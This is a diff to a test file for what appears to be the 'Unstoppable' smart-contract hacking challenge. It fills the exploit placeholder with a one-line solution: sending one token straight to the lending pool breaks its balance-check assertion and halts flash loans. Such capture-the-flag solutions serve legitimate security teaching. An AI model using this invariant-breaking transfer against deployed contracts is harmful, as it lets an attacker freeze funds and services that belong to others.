@@ -39,7 +39,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // exploit the assertion `assert(poolBalance == balanceBefore);` by transferring
+        // tokens through the ERC20 instead of calling `depositTokens`
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 
     after(async function () {
